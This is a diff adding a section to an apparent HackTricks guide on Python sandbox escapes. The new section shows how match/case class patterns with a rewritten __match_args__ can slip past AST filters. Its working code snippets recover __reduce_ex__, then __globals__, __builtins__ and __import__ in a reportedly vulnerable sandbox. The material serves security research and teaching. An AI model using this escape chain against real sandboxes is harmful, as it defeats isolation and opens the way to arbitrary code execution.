@@ -208,6 +208,39 @@ reportlab-xhtml2pdf-triple-brackets-expression-evaluation-rce-cve-2023-33733.md
 ## This is very useful for code injected inside "eval" as it doesn't support multiple lines or ";"
 ```
 
+## Structural pattern matching as an implicit attribute read
+
+In Python 3.10+, a class pattern first checks `isinstance(subject, Class)`. For a positional pattern, Python maps positions through `Class.__match_args__` and reads those attributes from the subject internally.<sup>[[18]](#references)</sup>
+
+An AST filter that only rejects `ast.Attribute` reads or `getattr()` calls can miss this `ast.MatchClass` path. This requires `match/case` to be allowed and a matching class whose `__match_args__` can be changed; it is not a bypass when the inspected object is wrapped by a proxy that enforces the same restriction.<sup>[[17]](#references)</sup>
+
+For example, `namedtuple()` can supply a mutable class even when the exposed builtins lack `__build_class__`. If literal dunder strings are filtered, build the name at runtime. The pattern below retrieves `__reduce_ex__` without reading it through submitted attribute syntax; in the reported sandbox, protocol 4 yielded the real Python function `copyreg.__newobj__` as the first element of the reconstruction recipe.<sup>[[17]](#references)</sup>
+
+```python
+from collections import namedtuple
+
+def dunder(name):
+    return chr(95)*2 + name + chr(95)*2
+
+Record = namedtuple("Record", "value")
+Record.__match_args__ = (dunder("reduce_ex"),)
+match Record(1):
+    case Record(reduce_method):
+        function = reduce_method(4)[0]
+print(function)  # <function __newobj__ ...>
+```
+
+A second class pattern needs to match that real function before it can read `__globals__`. The reported `_safe_type()` replacement returned a **mutable function-type proxy** for `type(lambda: None)` that nevertheless passed its function instance check. Only with that unsafe proxy behavior can the following continuation expose the original `__builtins__` dictionary and its `__import__` entry; the real immutable function type cannot be modified this way. See [builtins recovery](#builtins) for subsequent import and command-execution primitives.<sup>[[17]](#references)</sup>
+
+```python
+FunctionProxy = type(lambda: None)  # vulnerable sandbox's replacement type()
+FunctionProxy.__match_args__ = (dunder("globals"),)
+match function:
+    case FunctionProxy(module_globals):
+        real_builtins = module_globals[dunder("builtins")]
+        importer = real_builtins[dunder("import")]
+```
+
 ## Bypassing protections through encodings (UTF-7)
 
 In [**this writeup**](https://blog.arkark.dev/2022/11/18/seccon-en/#misc-latexipy) UFT-7 is used to load and execute arbitrary python code inside an apparent sandbox:<sup>[[11]](#references)</sup>
@@ -1217,5 +1250,7 @@ will be bypassed
 - [14] [GeeksforGeeks – Vulnerability in str.format() in Python](https://www.geeksforgeeks.org/vulnerability-in-str-format-in-python/)
 - [15] [ur4ndom – GCTF 2022 Treebox](https://ur4ndom.dev/posts/2022-07-04-gctf-treebox/)
 - [16] [checkoway.net - Musings - Pickle](https://checkoway.net/musings/pickle)
+- [17] [Breaking the AWS MCP Python Sandbox](https://xplo1t-sec.github.io/posts/breaking-the-aws-mcp-python-sandbox/)
+- [18] [PEP 634 - Structural Pattern Matching: Specification](https://peps.python.org/pep-0634/#class-patterns)
 
 {{#include ../../../banners/hacktricks-training.md}}
